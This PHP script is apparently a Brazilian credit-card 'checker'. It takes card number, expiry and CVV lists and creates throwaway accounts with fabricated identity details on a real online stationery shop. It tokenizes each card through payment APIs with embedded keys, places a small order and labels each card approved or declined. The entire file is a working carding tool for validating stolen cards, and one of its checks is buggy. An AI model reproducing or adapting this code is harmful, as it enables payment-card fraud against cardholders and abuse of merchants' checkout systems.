<?php 

error_reporting(0);
sleep(2);

function multiexplode($delimiters, $string)
{

    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return $launch;
}
function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


$lista = $_GET['lista'];

$explode = multiexplode(array('|',':','/',), $lista);

$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];

$compareano = 2023;
if ($ano > 4) {
  echo '<br><span style="background: linear-gradient(90deg, rgb(199 22 22) 0%, rgb(113 56 56) 100%);color: black;" class="badge bg-gold">[-] ERROR</span> => [Ano do cartao invalido] => [@Dudu]';
    return;
}
if (strlen($cc) !== 16 || strlen($mes) !== 2 || strlen($ano) !== 4) {
    echo '<br><span style="background: linear-gradient(90deg, rgb(199 22 22) 0%, rgb(113 56 56) 100%);color: black;" class="badge bg-gold">[-] ERROR</span> => [Cartao Invalido] => [@Dudu]';
    return;
}
if (!is_numeric($cc) || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    echo '<br><span style="background: linear-gradient(90deg, rgb(199 22 22) 0%, rgb(113 56 56) 100%);color: black;" class="badge bg-gold">[-] ERROR</span> => [Pare De Tacar Letras No Checker Porfavor!] => [@Dudu]';
    return;
}
if (empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
    echo '<br><span style="background: linear-gradient(90deg, rgb(199 22 22) 0%, rgb(113 56 56) 100%);color: black;" class="badge bg-gold">[-] ERROR</span> => [Cartao Invalido] => [@Dudu]';
    return;
}
if ($ano < $compareano) {
    echo '<br><span style="background: linear-gradient(90deg, rgb(199 22 22) 0%, rgb(113 56 56) 100%);color: black;" class="badge bg-gold">[-] ERROR</span> => [' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '] => [Ano Do Cartao E Invalido] => [@Dudu]';
    return;
}

if(file_exists('dudu.txt')){
    unlink('dudu.txt');
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.checkout.com/tokens");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt(
    $ch,
    CURLOPT_HTTPHEADER,
    array(
        'accept: */*',
        'authorization: pk_wf64cebluwwe46fsf7fgb3l5umk',
        'content-type: application/json',
        'origin: https://js.checkout.com',
        'referer: https://js.checkout.com/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0'
    )
);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"type":"card","number":"' . $cc . '","expiry_month":11,"expiry_year":2028,"cvv":"483","name":"Limo Soul","billing_address":{"address_line1":"Limoeiro Delasy","city":"Paris","state":"IDF","zip":"75011","country":"FR"},"phone":{"number":"5519996831732"},"preferred_scheme":"","requestSource":"JS"}');
$puxarbins = curl_exec($ch);
$pais = getStr($puxarbins, '"issuer_country":"', '",');
$bandeira = getStr($puxarbins, '"scheme":"', '",');
$tipo = getStr($puxarbins, '"card_type":"', '",');
$nivel = getStr($puxarbins, '"product_type":"', '"');
$banco = getStr($puxarbins, '"issuer":"', '",');
$INFO = "$bandeira $banco $tipo $nivel ($pais)";
$bin = substr($cc, 0,6);
$lestbin = substr($cc, 12,16);

$headers = array(
    'accept: application/json, text/javascript, */*; q=0.01',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'referer: https://www.dudu.com.br/produto/lapis-preto-redondo-n2-com-borracha-soho-tilibra-344362',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.54',
    'x-requested-with: XMLHttpRequest',
);
$headersEncrypt = array(
   'accept: application/json',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'content-type: application/json',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.54',
   'X-Pp-Public-Key: reCyuPFDQ7FkQhxovjGjttKQTqvopZN5U5D35DOw4c34dU1Jqs1UMT9O9YhUmPp1AJm8AD12oGJNwp8dXibvIKoxtcTtNVonLwlAWvwvotOymRtox4bydtIc'
  );

// $ch = curl_init();
// curl_setopt($ch, CURLOPT_URL, 'https://www.funpaperpapelaria.com.br/carrinho/produto/106931329/adicionar');
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/dudu.txt');
// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/dudu.txt');
// curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
// $addcard = curl_exec($ch);


$email = 'dudu'.rand(10,100000000).'%40gmail.com';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.funpaperpapelaria.com.br/conta/criar');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./dudu.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/dudu.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'next=%2Fconta%2Findex&email='.$email.'&confirmacao_email='.$email.'&senha=03.131-010&confirmacao_senha=03.131-010&tipo=PF&nome=Dudu+lindu&cpf=527.026.376-98&cnpj=&razao_social=&ie=&telefone_celular=%2898%29+99195-6700&telefone_principal=%2895%29+99195-6700&telefone_comercial=&sexo=m&data_nascimento=14%2F08%2F2000&cep=03131-010&endereco=Rua+Orfanato&numero=21&complemento=Je+&referencia=Jjjji&bairro=Vila+Prudente&cidade=S%C3%A3o+Paulo&estado=SP');
$createAccount  = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.funpaperpapelaria.com.br/carrinho/produto/106931329/adicionar');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/dudu.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/dudu.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$addcard = curl_exec($ch);

$headers = array(
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5',
    'cache-control: max-age=0',
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69',
);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.funpaperpapelaria.com.br/carrinho/valor/?envio_id=131477&envio_code=frete-fixo&valor_subtotal=1.99&forma_pagamento_id=&cartao_selecionado_id=');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/dudu.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/dudu.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$setPayment = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.funpaperpapelaria.com.br/carrinho/valor/?envio_id=131477&envio_code=frete-fixo&valor_subtotal=1.99&forma_pagamento_id=4&cartao_selecionado_id=novo');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/dudu.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/dudu.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$setPayment = curl_exec($ch);




$data = array(
    'number' => $cc,
    'holder_name' => 'Isis Lais Juliana Alves',
    'exp_month' => $mes,
    'exp_year' => $ano,
    'group_key' => 'df896d0a6e115ceba1484e20f0aa1985'
);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.tokenizer.pagali.com.br/v1/cards');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./dudu.txt');
//curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./dudu.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, $headersEncrypt);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
$card = curl_exec($ch);
$payid = getStr($card, '"id":"','",');
$cardid = getStr($card, '"token":"','",');

$data = array(
    'number' => $cvv,
);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.tokenizer.pagali.com.br/v1/cvvs');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./dudu.txt');
//curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./dudu.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, $headersEncrypt);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
$cvvcard = curl_exec($ch);

$payid2 = getStr($cvvcard, '"id":"','",');
$cvvid = getStr($cvvcard, '"token":"','",');
$created = getStr($cvvcard, '"created_at":"','",');



 $headers = array(
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5',
    'cache-control: max-age=0',
    'content-type: application/x-www-form-urlencoded',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69',
);


 curl_setopt($ch, CURLOPT_URL, 'https://www.funpaperpapelaria.com.br/checkout/finalizar');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/dudu.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/dudu.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'endereco_principal=0&cep=03131010&forma_envio=131477&forma_envio_code=frete-fixo&nome=Dudu+lindu&endereco=Rua+Orfanato&numero=21&complemento=Je+&referencia=Jjjji&bairro=Vila+Prudente&cidade=S%C3%A3o+Paulo&estado=SP&pais_id=BRA&cart_selected_shipping=131477&cart_selected_shipping_value=8.9&cart_selected_payment=9&payment_bank_id=&payment_session_id='.$payid.'&payment_session_name=&payment_token='.$cardid.'&payment_bin=650507&payment_last_digits=3589&payment_cvv='.$cvvid.'&payment_system_id=&payment_system_name=Elo&payment_fingerprint=ps-fbee6669d66c49d1a1b62c8a0e1ce41a154452dbc87910ce6e52cac4285c6d29&payment_installments=1&payment_installments_value=&payment_address_active=false&payment_address_postalCode=&payment_address_street=&payment_address_number=&payment_address_complement=&payment_address_neighborhood=&payment_address_city=&payment_address_state=&payment_address_country=BR&payment_client_active=false&payment_client_name=Dudu+lindu&payment_client_document=&payment_client_birthday=&payment_client_phone=&forma_pagamento=9&cartao_salvo_opcao=novo&cartao_cartao_numero=6505+0700+2231+3589&cartao_cartao_data_expiracao=12%2F33&cartao_cartao_nome=Dudu+lindu&payment_save_card=on&cupom=&timestamp_token='.$created.'');

$result = curl_exec($ch);


if (stripos($result, 'Estamos aguardando o pagamento. Você será informado do resultado por e-mail')) {
  
    echo "<br><font color='white'><span style='background: #50c943;color: white;' class='badge bg-gold'>🎁 @ Aprovada</span> » $cc|$mes|$ano|$cvv » $INFO  » <span style='background: #50c943;color: white;' class='badge bg-gold'>[ Transação aprovada ]</span> » @Dudu";
} elseif (stripos($result, "Por favor, revise seus dados de pagamento e tente novamente. A compra não foi finalizada devido a algum problema na autorização. Se o erro persistir, tente uma forma de pagamento diferente ou verifique se pode ter ocorrido algum problema com a operadora, no caso de compra com cartão.")) {
    echo "<br><font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>Reprovada</span> » $cc|$mes|$ano|$cvv » $INFO » <font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>[ Transação Negada ]</span> » @Dudu";
} else {
    
    echo "<br><font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>Reprovada</span> » $cc|$mes|$ano|$cvv » $INFO » <font color='white'><span style='background: #cb1a1a;color: white;' class='badge bg-gold'>[ Erro Interno ]</span> » @Dudu";
}
